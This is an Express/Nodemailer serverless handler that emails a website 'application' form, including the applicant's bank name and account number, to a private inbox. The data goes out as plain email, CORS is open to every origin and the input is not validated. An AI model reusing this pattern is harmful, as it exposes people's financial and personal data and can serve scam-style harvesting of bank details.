// /api/index.js

// 1. Import all necessary packages
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config(); // Load variables from .env for local testing

// 2. Create the Express app
const app = express();

// 3. Set up Middleware
app.use(cors()); // Enable CORS for all routes
app.use(express.json()); // Allow the server to parse JSON in request bodies

// 4. Load your secret credentials from environment variables
const SENDER_EMAIL = process.env.SENDER_EMAIL;
const SENDER_PASSWORD = process.env.SENDER_PASSWORD;
const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;

// 5. Create the API route that will receive the form data
app.post('/sendmail', (req, res) => {
  // Get the form data from the request body
  const data = req.body;

  // You can add validation logic here if you want...

  // Create the Nodemailer "transporter" object. This configures the email service.
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: SENDER_EMAIL,
      pass: SENDER_PASSWORD, // This MUST be the 16-character App Password
    },
  });

  // Define the content of the email
  const mailOptions = {
    from: SENDER_EMAIL,
    to: RECEIVER_EMAIL,
    subject: 'New Application from Your Website',
    text: `
      You have received a new application with the following details:

      --- Personal Information ---
      First Name: ${data['first-name'] || 'N/A'}
      Last Name: ${data['last-name'] || 'N/A'}
      Email: ${data.email || 'N/A'}
      Phone Number: ${data.phone || 'N/A'}
      Gender: ${data.gender || 'N/A'}
      Age: ${data.age || 'N/A'}
      Occupation: ${data.occupation || 'N/A'}

      --- Address ---
      Address: ${data.address || 'N/A'}
      City & State: ${data['city-state'] || 'N/A'}
      Zipcode: ${data.zipcode || 'N/A'}

      --- Banking ---
      Bank Name: ${data['bank-name'] || 'N/A'}
      Account Number: ${data['bank-number'] || 'N/A'}
    `,
  };

  // Use the transporter to send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Nodemailer Error:', error);
      // If there's an error, send a server error response
      return res.status(500).json({ status: 'error', message: 'Failed to send email.' });
    }

    // If the email is sent successfully
    console.log('Email sent successfully: ' + info.response);
    return res.status(200).json({
      status: 'success',
      message: 'Form sent successfully!',
      redirect: '/thank_you.html',
    });
  });
});

// 6. Export the app for Vercel to use as a serverless function
module.exports = app;